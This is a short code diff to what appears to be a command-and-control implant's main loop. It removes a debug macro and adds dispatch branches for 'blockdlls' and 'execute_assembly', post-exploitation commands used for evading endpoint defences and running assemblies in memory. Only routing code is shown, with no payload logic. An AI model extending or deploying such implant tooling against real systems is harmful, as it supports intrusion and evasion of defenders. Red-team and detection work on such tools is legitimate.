@@ -34,20 +34,6 @@ int current_jitter = CALLBACK_JITTER;
 // #define AGENT_UUID "..."
 #endif
 
-// Debug Macro (duplicated from utils.c for now, or move to common header)
-#if DEBUG
-#define DEBUG_PRINT(...)                                                       \
-  do {                                                                         \
-    fprintf(stdout, "[DEBUG] ");                                               \
-    fprintf(stdout, __VA_ARGS__);                                              \
-    fprintf(stdout, "\n");                                                     \
-    fflush(stdout);                                                            \
-  } while (0)
-#else
-#define DEBUG_PRINT(...)                                                       \
-  do {                                                                         \
-  } while (0)
-#endif
 
 int main() {
 
@@ -251,6 +237,14 @@ int main() {
 #ifdef INCLUDE_CMD_SPAWNAS
                 else if (strcmp(cmd_name, "spawnas") == 0)
                   command_spawnas(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_BLOCKDLLS
+                else if (strcmp(cmd_name, "blockdlls") == 0)
+                  command_blockdlls(task_id, params);
+#endif
+#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
+                else if (strcmp(cmd_name, "execute_assembly") == 0)
+                  command_execute_assembly(task_id, params);
 #endif
               }
               cmd_local_ptr += 1;
